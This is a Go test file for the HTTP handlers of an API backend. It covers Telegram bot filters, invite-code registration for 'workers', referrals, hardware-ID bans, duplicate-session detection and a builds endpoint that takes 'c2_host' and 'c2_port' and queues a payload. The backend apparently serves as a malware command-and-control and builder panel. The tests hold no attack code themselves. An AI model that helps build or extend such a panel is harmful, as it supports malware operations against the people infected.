func TestBot_Delete_Success(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewTelegramBotHandler(d)
	r := chi.NewRouter()
	r.Delete("/api/telegram/bots/{id}", h.Delete)

	bid := uuid.New().String()
	insertTelegramBot(t, d, bid, "bot", "123456:ABC", "-100")
	if _, err := d.Exec("INSERT INTO bot_filters (id, bot_id, filter_type, filter_value) VALUES ($1, $2, 'country', 'US')",
		uuid.New().String(), bid); err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodDelete, "/api/telegram/bots/"+bid, nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var filters int
	d.QueryRow("SELECT COUNT(*) FROM bot_filters WHERE bot_id = $1", bid).Scan(&filters)
	if filters != 0 {
		t.Errorf("expected cascaded filter delete, got %d filters", filters)
	}
}

func TestBot_Delete_DBError(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewTelegramBotHandler(d)
	r := chi.NewRouter()
	r.Delete("/api/telegram/bots/{id}", h.Delete)

	d.Close()
	req := httptest.NewRequest(http.MethodDelete, "/api/telegram/bots/x", nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusInternalServerError {
		t.Fatalf("expected 500, got %d", w.Code)
	}
}

func TestBot_ListFilters(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewTelegramBotHandler(d)
	r := chi.NewRouter()
	r.Get("/api/telegram/bots/{id}/filters", h.ListFilters)

	bid := uuid.New().String()
	insertTelegramBot(t, d, bid, "bot", "123456:ABC", "-100")
	if _, err := d.Exec("INSERT INTO bot_filters (id, bot_id, filter_type, filter_value) VALUES ($1, $2, 'country', 'US')",
		uuid.New().String(), bid); err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/telegram/bots/"+bid+"/filters", nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp []map[string]any
	json.Unmarshal(w.Body.Bytes(), &resp)
	if len(resp) != 1 || resp[0]["filter_type"] != "country" {
		t.Errorf("expected 1 filter, got %v", resp)
	}

	// missing id → 400
	req = httptest.NewRequest(http.MethodGet, "/api/telegram/bots//filters", nil)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("missing id: expected 400, got %d", w.Code)
	}
}

func TestBot_CreateFilter(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewTelegramBotHandler(d)
	r := chi.NewRouter()
	r.Post("/api/telegram/bots/{id}/filters", h.CreateFilter)

	bid := uuid.New().String()
	insertTelegramBot(t, d, bid, "bot", "123456:ABC", "-100")

	// success
	req := httptest.NewRequest(http.MethodPost, "/api/telegram/bots/"+bid+"/filters", bytes.NewReader([]byte(`{"filter_type":"country","filter_value":"US"}`)))
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusCreated {
		t.Fatalf("create: expected 201, got %d: %s", w.Code, w.Body.String())
	}

	// invalid type
	req = httptest.NewRequest(http.MethodPost, "/api/telegram/bots/"+bid+"/filters", bytes.NewReader([]byte(`{"filter_type":"bogus","filter_value":"x"}`)))
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("invalid type: expected 400, got %d", w.Code)
	}

	// missing fields
	req = httptest.NewRequest(http.MethodPost, "/api/telegram/bots/"+bid+"/filters", bytes.NewReader([]byte(`{"filter_type":"country"}`)))
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("missing fields: expected 400, got %d", w.Code)
	}

	// missing bot id
	req = httptest.NewRequest(http.MethodPost, "/api/telegram/bots//filters", bytes.NewReader([]byte(`{"filter_type":"country","filter_value":"US"}`)))
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("missing bot id: expected 400, got %d", w.Code)
	}

	// invalid JSON
	req = httptest.NewRequest(http.MethodPost, "/api/telegram/bots/"+bid+"/filters", bytes.NewReader([]byte(`bad`)))
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("invalid json: expected 400, got %d", w.Code)
	}
}

func TestBot_DeleteFilter(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewTelegramBotHandler(d)
	r := chi.NewRouter()
	r.Delete("/api/telegram/bots/{id}/filters/{filter_id}", h.DeleteFilter)

	bid := uuid.New().String()
	insertTelegramBot(t, d, bid, "bot", "123456:ABC", "-100")
	fid := uuid.New().String()
	if _, err := d.Exec("INSERT INTO bot_filters (id, bot_id, filter_type, filter_value) VALUES ($1, $2, 'country', 'US')",
		fid, bid); err != nil {
		t.Fatal(err)
	}

	// success
	req := httptest.NewRequest(http.MethodDelete, "/api/telegram/bots/"+bid+"/filters/"+fid, nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("delete: expected 200, got %d: %s", w.Code, w.Body.String())
	}

	// not found
	req = httptest.NewRequest(http.MethodDelete, "/api/telegram/bots/"+bid+"/filters/"+fid, nil)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusNotFound {
		t.Fatalf("delete again: expected 404, got %d", w.Code)
	}

	// missing ids (handler called without chi params) → 400
	req = httptest.NewRequest(http.MethodDelete, "/api/telegram/bots//filters/", nil)
	w = httptest.NewRecorder()
	h.DeleteFilter(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("missing ids: expected 400, got %d", w.Code)
	}
}

func TestBot_List_TokenMasking(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewTelegramBotHandler(d)
	r := chi.NewRouter()
	r.Get("/api/telegram/bots", h.List)

	bid := uuid.New().String()
	insertTelegramBot(t, d, bid, "bot", "1234567890:AAABBB", "-100")

	// non-admin sees masked token
	uid := createTestUserWithRole(t, d, "botmask", "pass", "user")
	req := httptest.NewRequest(http.MethodGet, "/api/telegram/bots", nil)
	req = withClaims(req, uid, "user")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	var resp []map[string]any
	json.Unmarshal(w.Body.Bytes(), &resp)
	token := resp[0]["token"].(string)
	if token == "1234567890:AAABBB" || !strings.Contains(token, "****") {
		t.Errorf("expected masked token, got %q", token)
	}

	// admin sees full token
	admin := createTestUser(t, d, "botadmin", "pass")
	req = httptest.NewRequest(http.MethodGet, "/api/telegram/bots", nil)
	req = withClaims(req, admin, "admin")
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	json.Unmarshal(w.Body.Bytes(), &resp)
	if resp[0]["token"] != "1234567890:AAABBB" {
		t.Errorf("expected full token for admin, got %v", resp[0]["token"])
	}
}

func TestBot_List_QueryError(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewTelegramBotHandler(d)
	r := chi.NewRouter()
	r.Get("/api/telegram/bots", h.List)

	d.Close()
	req := httptest.NewRequest(http.MethodGet, "/api/telegram/bots", nil)
	req = withClaims(req, "x", "admin")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusInternalServerError {
		t.Fatalf("expected 500, got %d", w.Code)
	}
}

// ---------- Users: Register ----------

func TestUsers_Register_Valid(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewUsersHandler(d, "test-secret")
	r := chi.NewRouter()
	r.Post("/api/auth/register", h.Register)

	if _, err := d.Exec("INSERT INTO invite_codes (code, role, tier, max_uses) VALUES ('INVITE-OK', 'worker', 'starter', 5)"); err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodPost, "/api/auth/register", bytes.NewReader([]byte(`{"username":"newbie","password":"secret123","invite_code":"INVITE-OK"}`)))
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusCreated {
		t.Fatalf("expected 201, got %d: %s", w.Code, w.Body.String())
	}
	var resp map[string]any
	json.Unmarshal(w.Body.Bytes(), &resp)
	if resp["token"] == "" || resp["role"] != "worker" {
		t.Errorf("unexpected register response: %v", resp)
	}

	var used int
	d.QueryRow("SELECT used_count FROM invite_codes WHERE code = 'INVITE-OK'").Scan(&used)
	if used != 1 {
		t.Errorf("expected used_count=1, got %d", used)
	}
}

func TestUsers_Register_Errors(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewUsersHandler(d, "test-secret")
	r := chi.NewRouter()
	r.Post("/api/auth/register", h.Register)

	if _, err := d.Exec("INSERT INTO invite_codes (code, role, tier, max_uses) VALUES ('INVITE-EXP', 'worker', 'starter', 5)"); err != nil {
		t.Fatal(err)
	}
	if _, err := d.Exec("INSERT INTO invite_codes (code, role, tier, max_uses, expires_at) VALUES ('INVITE-OLD', 'worker', 'starter', 5, $1)",
		time.Now().Add(-24*time.Hour).Format("2006-01-02 15:04:05")); err != nil {
		t.Fatal(err)
	}
	if _, err := d.Exec("INSERT INTO invite_codes (code, role, tier, max_uses, used_count) VALUES ('INVITE-USED', 'worker', 'starter', 1, 1)"); err != nil {
		t.Fatal(err)
	}

	post := func(body string) int {
		req := httptest.NewRequest(http.MethodPost, "/api/auth/register", bytes.NewReader([]byte(body)))
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)
		return w.Code
	}

	if code := post(`bad`); code != http.StatusBadRequest {
		t.Fatalf("invalid json: expected 400, got %d", code)
	}
	if code := post(`{"username":"x","password":"y"}`); code != http.StatusBadRequest {
		t.Fatalf("missing invite: expected 400, got %d", code)
	}
	if code := post(`{"username":"x","password":"y","invite_code":"NOPE"}`); code != http.StatusNotFound {
		t.Fatalf("invalid invite: expected 404, got %d", code)
	}
	if code := post(`{"username":"x","password":"y","invite_code":"INVITE-OLD"}`); code != http.StatusGone {
		t.Fatalf("expired invite: expected 410, got %d", code)
	}
	if code := post(`{"username":"x","password":"y","invite_code":"INVITE-USED"}`); code != http.StatusConflict {
		t.Fatalf("used invite: expected 409, got %d", code)
	}
}

func TestUsers_Register_UsernameTaken(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewUsersHandler(d, "test-secret")
	r := chi.NewRouter()
	r.Post("/api/auth/register", h.Register)

	if _, err := d.Exec("INSERT INTO invite_codes (code, role, tier, max_uses) VALUES ('INVITE-DUP', 'worker', 'starter', 5)"); err != nil {
		t.Fatal(err)
	}

	body := `{"username":"dupuser","password":"secret123","invite_code":"INVITE-DUP"}`
	req := httptest.NewRequest(http.MethodPost, "/api/auth/register", bytes.NewReader([]byte(body)))
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusCreated {
		t.Fatalf("first register: expected 201, got %d", w.Code)
	}
	req = httptest.NewRequest(http.MethodPost, "/api/auth/register", bytes.NewReader([]byte(body)))
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusConflict {
		t.Fatalf("duplicate username: expected 409, got %d: %s", w.Code, w.Body.String())
	}
}

// ---------- Referrals ----------

func TestReferral_GetCode_Generates(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewReferralHandler(d)
	r := chi.NewRouter()
	r.Get("/api/referrals/code", h.GetCode)

	uid := createTestUser(t, d, "refgen", "pass")

	req := httptest.NewRequest(http.MethodGet, "/api/referrals/code", nil)
	req = withClaims(req, uid, "user")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp map[string]string
	json.Unmarshal(w.Body.Bytes(), &resp)
	if resp["code"] == "" {
		t.Fatal("expected generated code")
	}
	var stored string
	if err := d.QueryRow("SELECT referral_code FROM users WHERE id = $1", uid).Scan(&stored); err != nil || stored == "" {
		t.Fatalf("expected referral_code persisted, got %q err %v", stored, err)
	}

	// Second call returns the same code without regenerating.
	req = httptest.NewRequest(http.MethodGet, "/api/referrals/code", nil)
	req = withClaims(req, uid, "user")
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	var resp2 map[string]string
	json.Unmarshal(w.Body.Bytes(), &resp2)
	if resp2["code"] != stored {
		t.Errorf("expected stable code %q, got %q", stored, resp2["code"])
	}

	// no claims → 401
	req = httptest.NewRequest(http.MethodGet, "/api/referrals/code", nil)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusUnauthorized {
		t.Fatalf("no claims: expected 401, got %d", w.Code)
	}
}

func TestReferral_Stats_WithRefers(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewReferralHandler(d)
	r := chi.NewRouter()
	r.Get("/api/referrals/stats", h.Stats)

	uid := createTestUser(t, d, "refstats", "pass")
	if _, err := d.Exec("UPDATE users SET referral_code = 'REFCODE' WHERE id = $1", uid); err != nil {
		t.Fatal(err)
	}
	if _, err := d.Exec("INSERT INTO purchases (id, user_id, product_id, license_key, referred_by, created_at) VALUES ($1, $2, 'p1', 'lk1', $3, CURRENT_TIMESTAMP)",
		uuid.New().String(), "other-user", uid); err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/referrals/stats", nil)
	req = withClaims(req, uid, "user")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp map[string]any
	json.Unmarshal(w.Body.Bytes(), &resp)
	if resp["code"] != "REFCODE" || resp["total_refers"] != float64(1) {
		t.Errorf("unexpected stats response: %v", resp)
	}

	// no claims → 401
	req = httptest.NewRequest(http.MethodGet, "/api/referrals/stats", nil)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusUnauthorized {
		t.Fatalf("no claims: expected 401, got %d", w.Code)
	}
}

func TestReferral_Apply_AlreadyApplied(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewReferralHandler(d)
	r := chi.NewRouter()
	r.Post("/api/referrals/apply", h.Apply)

	uid := createTestUser(t, d, "refdup", "pass")
	referrer := createTestUser(t, d, "refreferrer", "pass")
	if _, err := d.Exec("UPDATE users SET referral_code = 'R1' WHERE id = $1", referrer); err != nil {
		t.Fatal(err)
	}
	if _, err := d.Exec("INSERT INTO referrals (referrer_id, referred_user_id, code, applied_at) VALUES ($1, $2, 'R1', CURRENT_TIMESTAMP)",
		referrer, uid); err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodPost, "/api/referrals/apply", bytes.NewReader([]byte(`{"code":"R1"}`)))
	req = withClaims(req, uid, "user")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}
}

// ---------- Settings ----------

func TestSettings_Get_WithData(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewSettingsHandler(d, "test-secret")
	r := chi.NewRouter()
	r.Get("/api/settings", h.Get)

	if _, err := d.Exec("INSERT INTO settings (key, value) VALUES ('theme', 'dark')"); err != nil {
		t.Fatal(err)
	}
	uid := createTestUser(t, d, "setget", "pass")
	if _, err := d.Exec("INSERT INTO audit_log (id, user_id, action, details, ip, created_at) VALUES ($1, $2, 'x', 'y', '1.2.3.4', CURRENT_TIMESTAMP)",
		uuid.New().String(), uid); err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/settings", nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp api.SettingsResponse
	json.Unmarshal(w.Body.Bytes(), &resp)
	if resp.Settings["theme"] != "dark" {
		t.Errorf("expected theme=dark, got %v", resp.Settings)
	}
	if len(resp.Audit) != 1 {
		t.Errorf("expected 1 audit entry, got %d", len(resp.Audit))
	}
}

func TestSettings_Get_QueryError(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewSettingsHandler(d, "test-secret")
	r := chi.NewRouter()
	r.Get("/api/settings", h.Get)

	d.Close()
	req := httptest.NewRequest(http.MethodGet, "/api/settings", nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusInternalServerError {
		t.Fatalf("expected 500, got %d", w.Code)
	}
}

// ---------- Bans ----------

func TestBan_List_WithData(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewBanHandler(d)
	r := chi.NewRouter()
	r.Get("/api/bans", h.List)

	if _, err := d.Exec("INSERT INTO bans (id, ip, hwid, reason, created_by, banned_at) VALUES ($1, '1.2.3.4', NULL, 'spam', NULL, CURRENT_TIMESTAMP)",
		uuid.New().String()); err != nil {
		t.Fatal(err)
	}
	if _, err := d.Exec("INSERT INTO bans (id, ip, hwid, reason, created_by, banned_at) VALUES ($1, '5.6.7.8', 'hw-1', 'malware', 'u1', CURRENT_TIMESTAMP)",
		uuid.New().String()); err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/bans", nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp []map[string]any
	json.Unmarshal(w.Body.Bytes(), &resp)
	if len(resp) != 2 {
		t.Fatalf("expected 2 bans, got %d", len(resp))
	}
	if resp[1]["hwid"] != nil && resp[1]["hwid"] != "hw-1" {
		t.Errorf("unexpected hwid: %v", resp[1]["hwid"])
	}
}

func TestBan_List_QueryError(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewBanHandler(d)
	r := chi.NewRouter()
	r.Get("/api/bans", h.List)

	d.Close()
	req := httptest.NewRequest(http.MethodGet, "/api/bans", nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusInternalServerError {
		t.Fatalf("expected 500, got %d", w.Code)
	}
}

// ---------- Detect ----------

func TestDetect_Duplicates(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewDuplicateDetectHandler(d)
	r := chi.NewRouter()
	r.Get("/api/detect", h.Detect)

	uid := createTestUser(t, d, "detectdup", "pass")
	for _, id := range []string{"dup-s1", "dup-s2"} {
		if _, err := d.Exec("INSERT INTO sessions (id, build_id, hwid, ip, owner_id) VALUES ($1, 'b1', 'dup-hw', '9.9.9.9', $2)", id, uid); err != nil {
			t.Fatal(err)
		}
	}

	req := httptest.NewRequest(http.MethodGet, "/api/detect?hwid=dup-hw&ip=9.9.9.9", nil)
	req = withClaims(req, uid, "admin")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp api.DuplicateResponse
	json.Unmarshal(w.Body.Bytes(), &resp)
	if resp.Hwid.Count != 2 || len(resp.Hwid.Sessions) != 2 {
		t.Errorf("hwid: count=%d sessions=%v, want 2/2", resp.Hwid.Count, resp.Hwid.Sessions)
	}
	if resp.Ip.Count != 2 || len(resp.Ip.Sessions) != 2 {
		t.Errorf("ip: count=%d sessions=%v, want 2/2", resp.Ip.Count, resp.Ip.Sessions)
	}

	// missing params → 400
	req = httptest.NewRequest(http.MethodGet, "/api/detect", nil)
	req = withClaims(req, uid, "admin")
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d", w.Code)
	}
}

// ---------- Build ----------

func TestBuild_MissingC2Fields(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewBuildHandler(services.NewBuildService(), []byte{}, []byte{}, d)
	r := chi.NewRouter()
	r.Post("/api/builds", h.Build)

	uid := createTestUser(t, d, "buildc2", "pass")
	for _, body := range []string{`{}`, `{"c2_host":"x"}`, `{"c2_port":8080}`} {
		req := httptest.NewRequest(http.MethodPost, "/api/builds", bytes.NewReader([]byte(body)))
		req = withClaims(req, uid, "admin")
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)
		if w.Code != http.StatusBadRequest {
			t.Fatalf("build %s: expected 400, got %d: %s", body, w.Code, w.Body.String())
		}
	}
}

func TestBuild_QueuedWithoutPayload(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewBuildHandler(services.NewBuildService(), nil, nil, d)
	r := chi.NewRouter()
	r.Post("/api/builds", h.Build)

	req := httptest.NewRequest(http.MethodPost, "/api/builds", bytes.NewReader([]byte(`{"c2_host":"x","c2_port":8080}`)))
	req = withClaims(req, createTestUser(t, d, "builderr", "pass"), "admin")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusAccepted {
		t.Fatalf("expected 202 (async queue), got %d: %s", w.Code, w.Body.String())
	}

	var resp struct {
		Status string `json:"status"`
	}
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatal(err)
	}
	if resp.Status != "queued" {
		t.Errorf("status = %q, want %q", resp.Status, "queued")
	}
}

func TestBuild_UpdateTag_DBError(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewBuildHandler(services.NewBuildService(), []byte{}, []byte{}, d)
	r := chi.NewRouter()
	r.Put("/api/builds/{id}/tag", h.UpdateTag)

	d.Close()
	req := httptest.NewRequest(http.MethodPut, "/api/builds/x/tag", bytes.NewReader([]byte(`{"tag":"v2"}`)))
	req = withClaims(req, "x", "admin")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusInternalServerError {
		t.Fatalf("expected 500, got %d", w.Code)
	}
}

// ---------- Sessions: DeleteEmpty ----------

func TestSessions_DeleteEmpty(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewSessionsHandler(d, nil)
	r := chi.NewRouter()
	r.Delete("/api/sessions/empty", h.DeleteEmpty)

	uid := createTestUser(t, d, "delempty", "pass")
	if _, err := d.Exec("INSERT INTO sessions (id, build_id, owner_id, quality_score) VALUES ('empty-1', 'b1', $1, 0)", uid); err != nil {
		t.Fatal(err)
	}
	if _, err := d.Exec("INSERT INTO sessions (id, build_id, owner_id, quality_score) VALUES ('kept-1', 'b1', $1, 5)", uid); err != nil {
		t.Fatal(err)
	}

	// admin → deletes only quality_score=0
	req := httptest.NewRequest(http.MethodDelete, "/api/sessions/empty", nil)
	req = withClaims(req, uid, "admin")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp map[string]any
	json.Unmarshal(w.Body.Bytes(), &resp)
	if resp["deleted"] != float64(1) {
		t.Errorf("expected deleted=1, got %v", resp["deleted"])
	}

	// non-admin → 403
	req = httptest.NewRequest(http.MethodDelete, "/api/sessions/empty", nil)
	req = withClaims(req, uid, "user")
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusForbidden {
		t.Fatalf("non-admin: expected 403, got %d", w.Code)
	}
}

func TestSessions_DeleteEmpty_QueryError(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewSessionsHandler(d, nil)
	r := chi.NewRouter()
	r.Delete("/api/sessions/empty", h.DeleteEmpty)

	d.Close()
	req := httptest.NewRequest(http.MethodDelete, "/api/sessions/empty", nil)
	req = withClaims(req, "x", "admin")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusInternalServerError {
		t.Fatalf("expected 500, got %d", w.Code)
	}
}

// ---------- Marketplace: CreateProduct error paths ----------

func TestMarketplace_CreateProduct_Errors(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewMarketplaceHandler(d)
	r := chi.NewRouter()
	r.Post("/api/marketplace/products", h.CreateProduct)

	post := func(body string) int {
		req := httptest.NewRequest(http.MethodPost, "/api/marketplace/products", bytes.NewReader([]byte(body)))
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)
		return w.Code
	}
	if code := post(`bad`); code != http.StatusBadRequest {
		t.Fatalf("invalid json: expected 400, got %d", code)
	}
	if code := post(`{"name":"x","description":"y"}`); code != http.StatusBadRequest {
		t.Fatalf("missing product_type: expected 400, got %d", code)
	}
	if code := post(`{"name":"x","description":"y","product_type":"mod","price_cents":0}`); code != http.StatusBadRequest {
		t.Fatalf("zero price: expected 400, got %d", code)
	}
}
